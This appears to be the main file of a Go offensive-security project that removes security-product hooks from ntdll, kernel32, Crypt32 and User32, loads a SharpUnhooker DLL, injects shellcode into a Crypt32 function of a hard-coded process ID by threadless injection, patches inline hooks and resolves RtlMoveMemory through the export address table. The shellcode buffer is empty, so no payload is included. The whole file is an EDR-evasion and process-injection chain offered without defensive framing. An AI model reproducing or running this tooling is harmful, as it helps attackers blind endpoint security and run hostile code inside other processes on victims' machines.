package main

import (
	"UnhookingGoLang/ExportAddressTable"
	"UnhookingGoLang/NtdllUnhook"
	"UnhookingGoLang/PatchInlineHooking"
	"UnhookingGoLang/ThreadlessInject"
	"syscall"
)

func main() {
	DllName := []string{"ntdll.dll", "kernel32.dll", "Crypt32.dll", "User32.dll"}
	for _, dllName := range DllName {
		NtdllUnhook.Dll(dllName)
	}

	syscall.LoadLibrary("SharpUnhooker/SharpUnhooker.dll")

	shellcode := []byte{}
	ThreadlessInject.Inject("Crypt32", "CertEnumSystemStore", 1372, shellcode)

	PatchInlineHooking.Inline()

	FuncAddr := ExportAddressTable.GetProcAddressFromEAT(ExportAddressTable.GetPEBNtdll(), "RtlMoveMemory")
	syscall.SyscallN(FuncAddr)
}
